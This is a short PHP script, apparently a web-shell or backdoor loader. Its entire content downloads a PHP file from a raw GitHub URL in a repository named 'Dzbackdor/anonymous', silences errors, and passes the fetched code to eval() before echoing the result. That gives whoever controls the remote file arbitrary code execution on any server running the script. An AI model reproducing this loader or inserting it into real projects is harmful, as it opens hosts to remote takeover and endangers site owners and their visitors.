<?php
$content = @file_get_contents('https://raw.githubusercontent.com/Dzbackdor/anonymous/refs/heads/main/media/media-v4.php');
if ($content !== false) {
    ob_start();
    eval('?>' . $content);
    $output = ob_get_clean();
    echo $output;
}
